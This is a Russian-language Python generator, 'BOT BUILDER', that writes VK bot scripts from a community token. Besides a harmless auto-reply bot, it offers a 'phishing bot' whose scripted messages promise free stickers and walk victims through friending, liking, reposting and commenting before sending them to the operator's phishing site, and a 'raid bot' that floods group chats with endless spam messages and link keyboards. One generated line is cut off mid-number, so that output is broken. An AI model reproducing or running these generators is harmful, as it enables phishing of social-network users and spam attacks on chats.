import os,sys
import colorama
from colorama import init
os.system('clear')
print("""\033[34m                                                                                
,-----.   ,-----. ,--------.    ,-----.  ,--.   ,--.,------.  ,------.,------.  
|  |) /_ '  .-.  ''--.  .--'    |  |) /_ |  |   |  ||  .-.  \ |  .---'|  .--. ' 
|  .-.  \|  | |  |   |  |       |  .-.  \|  |   |  ||  |  \  :|  `--, |  '--'.' 
|  '--' /'  '-'  '   |  |       |  '--' /|  '--.|  ||  '--'  /|  `---.|  |\  \  
`------'  `-----'    `--'       `------' `-----'`--'`-------' `------'`--' '--' 
                                                                                \033[39m""")
print('\033[34mАвтор : sudoreboot2020\033[39m')

print("""\033[34m
[1] - обычный lite бот
[2] - бот для фишинга 
[3] - Рейд бот
[99] - Выход
\033[39m""")
while True:
    e = str(input("\033[35m[*]\033[39m"))
    if e == ('1'):
        tk = input('\033[31mВедите токен сообщества:\033[39m')


        f = str(input('name file.py:'))
        n = open(f,"w")

        n.write("""import vk_api
import random
import time
token = '"""+str(tk)+"""'


vk = vk_api.VkApi(token=token)

vk._auth_token()
print('Бот запущен')
while True:

    try:
        
        messages = vk.method("messages.getConversations", {"offset": 0, "count": 20, "filter": "unanswered"})
        if messages["count"] >= 1:
            id = messages["items"][0]["last_message"]["from_id"]
            body = messages["items"][0]["last_message"]["text"]
            if body.lower() == "привет":
                vk.method("messages.send", {"peer_id": id, "message": "Привет!", "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "кто я?":
                vk.method("messages.send", {"peer_id": id, "message": "Ты хороший человек", "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "!тест":
                vk.method("messages.send", {"peer_id": id, "message": "Бот работает!", "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "!команды":
                vk.method("messages.send", {"peer_id": id, "message": "Список команд:!тест , привет, кто я?", "random_id": random.randint(1, 2147483647)})
            else:
                vk.method("messages.send", {"peer_id": id, "message": "я не знаю что значит " + str(body.lower()), "random_id": random.randint(1, 2147483647)})
    except Exception as E:
        time.sleep(1)""")
        n.close()
        print('[>]Lite бот готов!\033[32m')
        break

    elif e == ('2'):
        tk = input('\033[31mВедите токен сообщества:\033[39m')
        id1 = input('\033[31mВедите кого добавить в друзья (https://vk.com/id1):\033[39m')
        wa = input('\033[31mВедите на какой пост лайк(https://vk.com/wall1_1):\033[39m')
        rep=input('\033[31mВедите какой пост нужно репостить 5 раз(https://vk.com/wall1_1):\033[39m')
        post = input('\033[31mВедите под каким постом нужно оставить отзыв(https://vk.com/wall1_1):\033[39m')
        lin =  input('\033[31mВедите ссылку на ваш фишинговый сайт:\033[39m')
        f = str(input('Имя файла (file.py):'))
        n = open(f, "w")

        n.write("""import vk_api
import random
import time
token = '"""+str(tk)+"""'


vk = vk_api.VkApi(token=token)

vk._auth_token()
print('Бот запущен')
while True:

    try:

        messages = vk.method("messages.getConversations", {"offset": 0, "count": 20, "filter": "unanswered"})
        if messages["count"] >= 1:
            id = messages["items"][0]["last_message"]["from_id"]
            body = messages["items"][0]["last_message"]["text"]
            if body.lower() == "привет":
                vk.method("messages.send", {"peer_id": id, "message": 'Прuвeт 👋 Чтoбы пoлyчuть cтuкepы тeбe нyжно выnoлнuть 4 зaдaнuя 💣Гoтoв(а)? Eсли дa,пuшu «!1»', "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "!1":
                vk.method("messages.send", {"peer_id": id, "message": 'Пepвoe зaдaнue 👇1)Добавь ["""+str(id1)+"""|его] в друзья ❤️ 2)Лайкни ["""+str(wa)+"""|эту] запись 3)Сдeлай репocт этой запuси себе на стeнy с коммeнтaрueм «Получил(a)» Выпoлнuл(a)? Еслu дa,пuшu «!2»', "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "!2":
                vk.method("messages.send", {"peer_id": id, "message": 'Вторoe зaдание 👇 Разoшли этy зaпuсь 5 дpyзьям онлaйн 💣 """+str(rep)+""" Pазocлaл(a)? Еслu дa,пuшu «!3»', "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "!3":
                vk.method("messages.send", {"peer_id": id, "message": 'Трeтьe зaдaнuе 👇Ocтавь комeнтapuū «Пoлyчuл(a)» пoд этoй зaпucью 👇 """+str(post)+""" .Bыпoлнuл(a)? Eслu дa,пuшu «!4»', "random_id": random.randint(1, 2147483647)})
            elif body.lower() == "!4":
                vk.method("messages.send", {"peer_id": id, "message": 'Чeтвёртoе зaдaние 👇Скoпuрyй текcт из kоммeнтаpия пo ccылкe u ocтавь eгo в кoммeнтaрuях гpyппы «Шлём ceрдeчкu» 4 рaзa """+str(lin)+""" .Bыпoлнuл(a)? Еслu дa,пuшu «Bсё»', "random_id": random.randint(1, 2147483647)})
            else:
                vk.method("messages.send", {"peer_id": id, "message": "я не знаю что значит " + str(body.lower()), "random_id": random.randint(1, 21474>

    except Exception as E:
        time.sleep(1)""")
        n.close()
        print('\033[32m[>]Бот готов!\033[39m')
        break
    elif e == ('3'):
        print(''' \033[31m____ ____ ____ ____ _________ ____ ____ ____ 
||R |||A |||D |||E |||       |||B |||O |||T ||
||__|||__|||__|||__|||_______|||__|||__|||__||
|/__\|/__\|/__\|/__\|/_______\|/__\|/__\|/__\|\033[39m
        ''')
        tk = input('\033[31mВедите токен сообщества:\033[39m')
        gr = str(input('\033[31mЧисловой id группы (123456):\033[39m'))

        f = str(input('Имя файла (file.py):'))
        n = open(f,"w")
        n.write("""import vk_api
from numpy import random
import time
from threading import Thread
from enum import Enum
from vk_api.keyboard import VkKeyboard, VkKeyboardColor
import six
import traceback
from vk_api.bot_longpoll import VkBotLongPoll, VkBotEventType


vk_session = vk_api.VkApi(token='"""+str(tk)+"""')
vk = vk_session.get_api()
print('Bot started!')
def pizda():
    longpoll = VkBotLongPoll(vk_session,     '"""+str(gr)+"""')
    for event in longpoll.listen():
        if event.type == VkBotEventType.MESSAGE_NEW:
            if event.from_chat:
                while True:
                       colorr = random.choice(['negative','primary', 'positive', 'secondary'])
                       color = random.choice(['negative','positive', 'primary', 'secondary'])
                       colo = random.choice(['negative','primary', 'positive', 'secondary'])
                       col = random.choice(['negative','primary', 'positive', 'secondary'])
                       textfobot = random.choice(['vto.pe','olike.ru','vkrutilka.ru'])
                       textfobo = random.choice(['vto.pe','olike.ru','vkrutilka.ru'])
                       textfob = random.choice(['vto.pe','olike.ru','vkrutilka.ru'])
                       textfo = random.choice(['vto.pe','olike.ru','vkrutilka.ru'])
                       keyboard = VkKeyboard(one_time=False)
                       keyboard.add_button(textfobot, color=colorr)
                       keyboard.add_button(textfobo, color=color)
                       keyboard.add_button(textfob, color=colo)
                       keyboard.add_button(textfo, color=col)
                       keyboard.add_line()
                       text1 = random.choice(['vto.pe','olike.ru','vkrutilka.ru'])
                       text2 = random.choice(['vto.pe','olike.ru','vkrutilka.ru'])
                       text3 = random.choice(['vto.pe','olike.ru','vkrutilka.ru'])
                       text4 = random.choice(['vto.pe','olike.ru','vkrutilka.ru'])
                       col1 = random.choice(['negative','primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative','primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative','primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative','primary', 'positive', 'secondary'])
                       keyboard.add_button(text1, color=col1)
                       keyboard.add_button(text2, color=col2)
                       keyboard.add_button(text3, color=col3)
                       keyboard.add_button(text4, color=col4)
                       keyboard.add_line()
                       text1 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text2 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text3 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text4 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       col1 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative', 'positive', 'secondary', 'primary'])
                       keyboard.add_button(text1,color=col1)
                       keyboard.add_button(text2,color=col2)
                       keyboard.add_button(text3,color=col3)
                       keyboard.add_button(text4,color=col4)
                       keyboard.add_line()
                       text1 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text2 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text3 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text4 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       col1 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative', 'positive', 'secondary', 'primary'])
                       keyboard.add_button(text1, color=col1)
                       keyboard.add_button(text2, color=col2)
                       keyboard.add_button(text3, color=col3)
                       keyboard.add_button(text4, color=col4)
                       keyboard.add_line()
                       text1 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text2 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text3 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text4 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       col1 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative', 'positive', 'secondary', 'primary'])
                       keyboard.add_button(text1, color=col1)
                       keyboard.add_button(text2, color=col2)
                       keyboard.add_button(text3, color=col3)
                       keyboard.add_button(text4, color=col4)
                       keyboard.add_line()
                       text1 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text2 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text3 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text4 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       col1 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative', 'positive', 'secondary', 'primary'])
                       keyboard.add_button(text1, color=col1)
                       keyboard.add_button(text2, color=col2)
                       keyboard.add_button(text3, color=col3)
                       keyboard.add_button(text4, color=col4)
                       keyboard.add_line()
                       text1 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text2 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text3 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text4 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       col1 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative', 'positive', 'secondary', 'primary'])
                       keyboard.add_button(text1, color=col1)
                       keyboard.add_button(text2, color=col2)
                       keyboard.add_button(text3, color=col3)
                       keyboard.add_button(text4, color=col4)
                       keyboard.add_line()
                       text1 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text2 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text3 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text4 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       col1 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative', 'positive', 'secondary', 'primary'])
                       keyboard.add_button(text1, color=col1)
                       keyboard.add_button(text2, color=col2)
                       keyboard.add_button(text3, color=col3)
                       keyboard.add_button(text4, color=col4)
                       keyboard.add_line()
                       text1 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text2 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text3 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text4 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       col1 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative', 'positive', 'secondary', 'primary'])
                       keyboard.add_button(text1, color=col1)
                       keyboard.add_button(text2, color=col2)
                       keyboard.add_button(text3, color=col3)
                       keyboard.add_button(text4, color=col4)
                       keyboard.add_line()
                       text1 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text2 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text3 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       text4 = random.choice(['vto.pe', 'olike.ru', 'vkrutilka.ru'])
                       col1 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col2 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col3 = random.choice(['negative', 'primary', 'positive', 'secondary'])
                       col4 = random.choice(['negative', 'positive', 'secondary', 'primary'])
                       keyboard.add_button(text1, color=col1)
                       keyboard.add_button(text2, color=col2)
                       keyboard.add_button(text3, color=col3)
                       keyboard.add_button(text4, color=col4)
                       vk.messages.send(chat_id=event.chat_id,attachment='wall-194324511_2',random_id='0',keyboard=keyboard.get_keyboard())
                       vk.messages.send(chat_id=event.chat_id,attachment='wall-194324511_2',random_id='0',keyboard=keyboard.get_keyboard())
while True:
    try:
        pizda()
    except Exception as e:
        print('Error', traceback.format_exc())""")
        n.close()
        print('\033[32m[>]Рейд бот готов!\033[39m')
        break
    elif e == ('99'):
        print("\033[31mДо новой встречи!\033[39m")
        break
